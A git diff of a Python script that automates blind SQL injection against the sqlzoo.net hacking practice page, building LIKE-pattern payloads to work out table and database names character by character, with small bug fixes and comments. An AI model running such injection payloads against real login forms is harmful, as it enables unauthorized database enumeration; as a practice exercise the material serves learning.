@@ -376,7 +376,7 @@ def isVulnerable(url):
    mhm = readQuery(txt)
    return mhm
 
-def characterInTableName(ch, url, index = "no index"):
+def characterInTableName(ch, url, index = "no index"): #track
    """
    https://sqlzoo.net/hack/24table.htm
    Is there a table called one in database test?
@@ -402,7 +402,7 @@ def constructTableQuery(ch, index):
 
    tableStr = ""
 
-   if(index = "no index"):
+   if(index == "no index"):
       tableStr += "%" + ch + "%"
    elif(index >= 0):
       tableStr += index * "_" + ch + "%"
@@ -415,7 +415,7 @@ def constructTableQuery(ch, index):
    #do I even need the AND ''=' part? it evaluates to '' = '' which is true so true/false AND true? Seems redundant
    return payload
 
-def nTablesMatch(n, ch, url, index = "no index"):
+def nTablesMatch(n, ch, url, index = "no index"): # 89 tables with "h", "a", "c"; 2  tables with "k"
    """ how many tables match
 
    Args:
@@ -448,20 +448,20 @@ def tableMatch(n, ch, url, index = "no index"):
    if(index == "no index"): 
    # could rewrite this as the else statement, would mean anything but a number would act like no index does here
       payload += "%" + ch + "%"
-   if(index < 0):
+   elif(index < 0):
       index += 1
       index *= -1
       payload += "%" + ch + "_" * index 
    else:
       payload += index * "_" + ch + "%"
 
-   payload += "')>" + n + " AND ''='"
+   payload += "')>" + str(n) + " AND ''='"
    payload = NamePasswordDictionary(payload, "name", "password")
    txt = sendQuery(payload, url)
    return readQuery(txt)
 
 
-def characterInDatabaseName(ch, url, index = "no index"):
+def characterInDatabaseName(ch, url, index = "no index"): #hack
    """
    
    Args:
